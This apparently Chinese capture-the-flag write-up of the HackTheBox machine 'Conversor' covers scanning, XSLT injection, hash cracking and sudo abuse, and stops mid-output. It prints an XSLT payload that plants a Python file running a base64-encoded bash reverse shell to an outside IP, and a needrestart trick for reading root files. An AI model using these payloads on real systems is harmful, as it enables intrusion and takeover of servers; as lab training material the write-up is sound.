"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.9\u003c/span\u003ep1 Ubuntu 3ubuntu0\u003cspan class=\"hljs-number\"\u003e.13\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e 01:\u003cspan class=\"hljs-number\"\u003e74\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:bc:6a:e2:cb:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:8b:\u003cspan class=\"hljs-number\"\u003e71\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e84\u003c/span\u003e:9c:f8:5a (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e 3a:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e:dc:\u003cspan class=\"hljs-number\"\u003e74\u003c/span\u003e:d8:e3:c4:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:e2:08:06:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:ee (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e (Ubuntu)\n|_http-title: Did \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e follow redirect to http://conversor.htb/\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.19\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hops\nService Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/icmp)\nHOP RTT      ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e51.96\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.14\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e52.06\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.92\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14.76\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e80 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随意注册一个用户进行登录，进入后台后，是一个文件转换点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击下载模板可以下载一个 \u003ccode\u003enmap.xslt\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e这是一个 XSLT (Extensible Stylesheet Language Transformations) 样式表文件\u003c/p\u003e\n\u003cp\u003e它的核心作用是将 Nmap (网络扫描工具) 生成的原始 XML 格式的扫描结果 转换成一个 美观、易读的 HTML 报告页面\u003c/p\u003e\n\u003cp\u003e简而言之，它是一个 Nmap 报告生成器\u003c/p\u003e\n\u003cp\u003e尝试一下该网站上的功能，首先通过 nmap 生成 XML 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -A -oX test.xml -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.92\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传下载模板以及生成XML文件后得到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我注意到转换的数据包里面的内容是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e------geckoformboundary3e7871c7873ce6edd6adafba839b063a\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"xml_file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"test.xml\"\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/xml\n\nxxe 内容\n------geckoformboundary3e7871c7873ce6edd6adafba839b063a\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"xslt_file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"nmap.xslt\"\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: application/xml\n\nxslt 内容\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e索性尝试了 XXE ，但是没有收获\u003c/p\u003e\n\u003cp\u003e继续寻找其他内容，发现在 about 中能下载源代码…\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eXSLT Injection\u003c/h2\u003e\n\u003cp\u003e首先会告诉我们每分钟都会执行 \u003ccode\u003escripts\u003c/code\u003e 下的 \u003ccode\u003epy\u003c/code\u003e 文件，估计是要写文件了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eIf you want to run Python scripts (\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e example, our server deletes \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e files older than \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e minutes to avoid system overload), you can add the following line to your /etc/crontab.\n\n\u003cspan class=\"hljs-string\"\u003e\"\"\"\n* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done\n\"\"\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在压缩包里面能找到一个 db 文件，但是通过 sqlite 打开后发现两张表，但是都是空的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-shell\"\u003e\u003cspan class=\"hljs-meta prompt_\"\u003esqlite\u003e \u003c/span\u003e\u003cspan class=\"bash\"\u003e.table\u003c/span\u003e\nfiles  users\n\u003cspan class=\"hljs-meta prompt_\"\u003esqlite\u003e \u003c/span\u003e\u003cspan class=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\u003c/span\u003e\n\u003cspan class=\"hljs-meta prompt_\"\u003esqlite\u003e \u003c/span\u003e\u003cspan class=\"bash\"\u003eSELECT * from files;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e随后通过 AI 进行对源码代码审计，发现一个高危漏洞：XSLT 注入与任意文件读取 (LFI)\u003c/p\u003e\n\u003cp\u003e位置： \u003ccode\u003e/convert\u003c/code\u003e 路由\u003c/p\u003e\n\u003cp\u003e风险描述：代码使用了 \u003ccode\u003elxml.etree\u003c/code\u003e 进行 XML 和 XSLT 文件的解析与转换。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;PYTHON\u003e\nparser = etree.XMLParser(resolve_entities=\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, no_network=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e, dtd_validation=\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, load_dtd=\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e)\nxml_tree = etree.parse(xml_path, parser)\nxslt_tree = etree.parse(xslt_path)\ntransform = etree.XSLT(xslt_tree)\nresult_tree = transform(xml_tree)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尽管开发者通过设置 \u003ccode\u003eresolve_entities=False\u003c/code\u003e 和 \u003ccode\u003eno_network=True\u003c/code\u003e 成功缓解了经典的XXE (XML 外部实体注入) 漏洞，但这些防护措施只应用于 XML 文档的解析，而没有阻止 XSLT 转换本身可能带来的风险。\u003c/p\u003e\n\u003cp\u003e如果攻击者能够上传一个恶意的 XSLT 文件，并且 \u003ccode\u003elxml\u003c/code\u003e 库的配置允许，他们可以使用 XSLT 2.0 或更高版本中的 \u003ccode\u003edocument()\u003c/code\u003e 函数来访问本地文件系统。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html\"\u003ehttps://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e测试 \u003ccode\u003eXSLT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?xml version=\u003cspan class=\"hljs-string\"\u003e\"1.0\"\u003c/span\u003e encoding=\u003cspan class=\"hljs-string\"\u003e\"ISO-8859-1\"\u003c/span\u003e?\u003e\n\u0026#x3C;xsl:stylesheet version=\u003cspan class=\"hljs-string\"\u003e\"1.0\"\u003c/span\u003e xmlns:xsl=\u003cspan class=\"hljs-string\"\u003e\"http://www.w3.org/1999/XSL/Transform\"\u003c/span\u003e\u003e\n\u0026#x3C;xsl:template \u003cspan class=\"hljs-keyword\"\u003ematch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e\u003e\n Version: \u0026#x3C;xsl:value-of select=\u003cspan class=\"hljs-string\"\u003e\"system-property('xsl:version')\"\u003c/span\u003e /\u003e\u0026#x3C;br /\u003e\n Vendor: \u0026#x3C;xsl:value-of select=\u003cspan class=\"hljs-string\"\u003e\"system-property('xsl:vendor')\"\u003c/span\u003e /\u003e\u0026#x3C;br /\u003e\n Vendor URL: \u0026#x3C;xsl:value-of select=\u003cspan class=\"hljs-string\"\u003e\"system-property('xsl:vendor-url')\"\u003c/span\u003e /\u003e\u0026#x3C;br /\u003e\n\u0026#x3C;/xsl:template\u003e\n\u0026#x3C;/xsl:stylesheet\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还是存在 XSLT 注入的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e寻找上传文件的 \u003ccode\u003epayload\u003c/code\u003e :\u003c/p\u003e\n\u003cp\u003e在 \u003ca href=\"https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#remote-code-execution-with-native-net\"\u003ehttps://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#remote-code-execution-with-native-net\u003c/a\u003e      的底下能找到 →      \u003ca href=\"https://x.com/ptswarm/status/1796162911108255974\"\u003ehttps://x.com/ptswarm/status/1796162911108255974\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们尝试一下，将 base64 代码换成自己的弹 \u003ccode\u003eshell\u003c/code\u003e 代码（PS: 注意 py 代码前不能有空格）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?xml version=\u003cspan class=\"hljs-string\"\u003e\"1.0\"\u003c/span\u003e encoding=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e?\u003e\n\u0026#x3C;xsl:stylesheet\n    xmlns:xsl=\u003cspan class=\"hljs-string\"\u003e\"http://www.w3.org/1999/XSL/Transform\"\u003c/span\u003e\n    xmlns:ptswarm=\u003cspan class=\"hljs-string\"\u003e\"http://exslt.org/common\"\u003c/span\u003e\n    extension-element-prefixes=\u003cspan class=\"hljs-string\"\u003e\"ptswarm\"\u003c/span\u003e\n    version=\u003cspan class=\"hljs-string\"\u003e\"1.0\"\u003c/span\u003e\u003e\n\u0026#x3C;xsl:template \u003cspan class=\"hljs-keyword\"\u003ematch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e\u003e\n\t\u0026#x3C;ptswarm:document href=\u003cspan class=\"hljs-string\"\u003e\"/var/www/conversor.htb/scripts/comeuiiaa.py\"\u003c/span\u003e method=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os;os.system(\u003cspan class=\"hljs-string\"\u003e'printf L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExMC82NjY2IDA+JjEn | base64 -d | bash'\u003c/span\u003e)\n  \u0026#x3C;/ptswarm:document\u003e\n\u0026#x3C;/xsl:template\u003e\n\u0026#x3C;/xsl:stylesheet\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待执行，成功反弹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - to fismathac\u003c/h2\u003e\n\u003cp\u003e我们拿一下之前是空的 users.db\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esqlite\u003e select * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e users;\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e|saboten|8a0f38c6c4894948f996c9ba93e90d6a\n\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e|bmac|d00f5d5217896fb7fd601412cb890830\n\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e|wick|9708d66b9338e4ee6f5db99a65f202de\n\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e|admin|21232f297a57a5a743894a0e4a801fc3\n\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e|paras|08af7c3e82d6b1975d7f16ff1bac9abf\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e|master|57b50ebc22d544e7ffd797629c4af943\n\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e|hacker|cf787ad3ebe79129ba3a149b6b287bf7\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e刚好家目录中存在 \u003ccode\u003efismathac\u003c/code\u003ek 用户\u003c/p\u003e\n\u003cp\u003e爆破得到密码 \u003ccode\u003eKeepmesafeandwarm\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Conversor john --wordlist=/usr/share/wordlists/rockyou.txt --\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=Raw-MD5 \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \nUsing default \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e encoding: UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nLoaded \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (Raw-MD5 [MD5 \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e AVX2 8x3])\nWarning: no OpenMP support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e this \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e, consider --fork=\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Ctrl-C to abort, almost \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nKeepmesafeandwarm (?)     \n1g \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:01 DONE (\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:04) \u003cspan class=\"hljs-number\"\u003e0.8771\u003c/span\u003eg/s 9625Kp/s 9625Kc/s 9625KC/s Keiser01..Kebiti\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show --format=Raw-MD5\"\u003c/span\u003e options to display \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 SSH 成功进入系统\u003c/p\u003e\n\u003ch2\u003e提权 - to root\u003c/h2\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003efismathack@conversor:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e fismathack on conversor:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e, use_pty\n\nUser fismathack may run the following commands on conversor:\n    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结束\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003efismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt\nError parsing /root/root.txt: Bareword \u003csp
